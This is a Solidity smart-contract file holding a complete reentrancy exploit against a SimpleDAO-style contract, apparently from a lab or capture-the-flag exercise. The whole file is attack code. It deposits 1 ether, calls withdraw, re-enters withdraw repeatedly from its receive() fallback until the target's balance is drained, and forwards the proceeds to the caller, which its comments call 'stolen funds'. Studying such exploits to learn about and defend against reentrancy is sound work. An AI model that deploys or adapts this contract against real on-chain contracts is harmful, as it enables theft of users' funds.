// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./interfaces/ISimpleDAO.sol";

/**
 * @title ReentrancyExploit
 * @dev Exploits the reentrancy vulnerability in withdraw function
 */
contract ReentrancyExploit {
    ISimpleDAO public dao;
    uint256 private constant ATTACK_AMOUNT = 1 ether;

    constructor(address _dao) {
        dao = ISimpleDAO(_dao);
    }

    function attack() external payable {
        require(msg.value == ATTACK_AMOUNT, "Send 1 ether to start attack");

        // Initial donation
        dao.donate{value: ATTACK_AMOUNT}();

        // Start the reentrancy attack
        dao.withdraw(ATTACK_AMOUNT);

        // Send stolen funds to attacker
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        uint256 daoBalance = address(dao).balance;
        if (daoBalance >= ATTACK_AMOUNT) {
            dao.withdraw(ATTACK_AMOUNT);
        }
    }
}
